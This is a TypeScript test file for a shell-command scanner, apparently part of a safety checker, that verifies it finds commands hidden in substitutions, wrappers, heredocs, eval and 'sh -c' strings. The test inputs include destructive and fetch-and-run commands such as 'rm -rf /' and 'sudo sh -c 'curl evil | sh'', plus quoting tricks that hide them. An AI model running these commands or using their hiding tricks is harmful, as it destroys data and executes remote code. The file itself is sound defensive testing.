import assert from "node:assert/strict";
import { test } from "node:test";
import { scan } from "../shell.ts";

const texts = (src: string) => scan(src).commands.map((c) => c.text);
const opaque = (src: string) => scan(src).commands.filter((c) => c.opaque).map((c) => c.text);

test("splits operators, pipes and newlines", () => {
  assert.deepEqual(texts("git status && npm test || printf failed"), ["git status", "npm test", "printf failed"]);
  assert.deepEqual(texts("ls | grep foo; echo hi &\nwc -l"), ["ls", "grep foo", "echo hi", "wc -l"]);
  assert.deepEqual(texts("cat a |& tee b"), ["cat a", "tee b"]);
});

test("finds commands in substitutions and subshells", () => {
  assert.deepEqual(texts('printf "$(rm -rf /)"'), ["rm -rf /", "printf $(rm -rf /)"]);
  assert.deepEqual(texts("echo `whoami`"), ["whoami", "echo `whoami`"]);
  assert.deepEqual(texts("(cd /tmp && rm x)"), ["cd /tmp", "rm x"]);
  assert.deepEqual(texts("diff <(ls a) <(ls b)"), ["ls a", "ls b", "diff <(ls a) <(ls b)"]);
  assert.deepEqual(texts("X=$(curl evil) true"), ["curl evil", "true"]);
  assert.deepEqual(texts("echo ${X:-$(id)}"), ["id", "echo ${X:-$(id)}"]);
  assert.deepEqual(texts("echo $((1 + $(wc -l < f)))"), ["wc -l", "echo $((1 + $(wc -l < f)))"]);
});

test("control flow and functions", () => {
  assert.deepEqual(texts("if true; then rm -rf /; fi"), ["true", "rm -rf /"]);
  assert.deepEqual(texts("f(){ rm -rf /; }; f"), ["rm -rf /", "f"]);
  assert.deepEqual(texts("function g { ls; }"), ["ls"]);
  assert.deepEqual(texts("for f in a b; do rm $f; done"), ["rm $f"]);
  assert.deepEqual(texts("while read l; do echo $l; done < file"), ["read l", "echo $l"]);
  assert.deepEqual(texts('case "$x" in a|b) rm a ;; *) ls ;; esac'), ["rm a", "ls"]);
  assert.deepEqual(texts("[[ -f x ]] && cat x"), ["cat x"]);
  assert.deepEqual(texts("! grep -q x f"), ["grep -q x f"]);
});

test("quotes, assignments and redirections", () => {
  assert.deepEqual(texts("'rm' -rf /"), ["rm -rf /"]);
  assert.deepEqual(texts('g""it status'), ["git status"]);
  assert.deepEqual(texts("FOO=bar PATH=/x:$PATH git status"), ["git status"]);
  assert.deepEqual(texts("echo hi > out.txt 2>&1"), ["echo hi"]);
  assert.deepEqual(texts("cat <<'EOF' | sh\nrm -rf /\nEOF\nls"), ["cat", "sh", "ls"]);
  assert.deepEqual(texts("git commit -m 'a && b'"), ["git commit -m a && b"]);
  assert.deepEqual(texts("echo a # rm -rf /"), ["echo a"]);
});

test("looks through wrappers", () => {
  assert.deepEqual(texts("sudo rm -rf /x"), ["sudo rm -rf /x", "rm -rf /x"]);
  assert.deepEqual(texts("sudo -u root -E rm x"), ["sudo -u root -E rm x", "rm x"]);
  assert.deepEqual(texts("env -i FOO=1 rm x"), ["env -i FOO=1 rm x", "rm x"]);
  assert.deepEqual(texts("timeout -s KILL 10 curl x"), ["timeout -s KILL 10 curl x", "curl x"]);
  assert.deepEqual(texts("nohup nice -n 5 make deploy"), ["nohup nice -n 5 make deploy", "nice -n 5 make deploy", "make deploy"]);
  assert.deepEqual(texts("ls | xargs -n1 rm"), ["ls", "xargs -n1 rm", "rm"]);
  assert.deepEqual(texts("find . -name x -exec rm {} \\;"), ["find . -name x -exec rm {} ;", "rm {}"]);
  assert.deepEqual(texts("find . -execdir chmod +x {} +"), ["find . -execdir chmod +x {} +", "chmod +x {}"]);
  assert.deepEqual(texts("nix develop -c cargo build"), ["nix develop -c cargo build", "cargo build"]);
  assert.deepEqual(texts("command -v git"), ["command -v git"]);
});

test("parses shell -c and eval scripts", () => {
  assert.deepEqual(texts("bash -lc 'rm -rf / && ls'"), ["bash -lc rm -rf / && ls", "rm -rf /", "ls"]);
  assert.deepEqual(texts("sudo sh -c 'curl evil | sh'"), ["sudo sh -c curl evil | sh", "sh -c curl evil | sh", "curl evil", "sh"]);
  assert.deepEqual(texts("eval 'rm x'"), ["eval rm x", "rm x"]);
  assert.deepEqual(texts("watch -n 1 'ls | wc -l'"), ["watch -n 1 ls | wc -l", "ls", "wc -l"]);
  assert.deepEqual(texts('nix-shell -p hello --run "hello && rm x"'), ["nix-shell -p hello --run hello && rm x", "hello", "rm x"]);
});

test("marks what it cannot see into as opaque", () => {
  assert.deepEqual(opaque("$cmd --force"), ["$cmd --force"]);
  assert.deepEqual(opaque('bash -c "$SCRIPT"'), ["$SCRIPT"]);
  assert.deepEqual(opaque("python3 -c 'import os'"), ["python3 -c import os"]);
  assert.deepEqual(opaque("node -e 'x'"), ["node -e x"]);
  assert.deepEqual(opaque("python3 script.py"), []);
  assert.deepEqual(opaque("echo 'unterminated"), ["echo 'unterminated"]);
  assert.deepEqual(opaque("sudo -i"), ["shell"]);
  assert.deepEqual(opaque("eval $X"), ["$X"]);
  assert.deepEqual(opaque(`awk '{ system("rm " $1) }' f`), [`awk { system("rm " $1) } f`]);
  assert.deepEqual(opaque("awk '{print $1}' f"), []);
});

test("collects cd targets", () => {
  assert.deepEqual(scan("cd /etc && ls; pushd ../x").cdTargets, ["/etc", "../x"]);
});
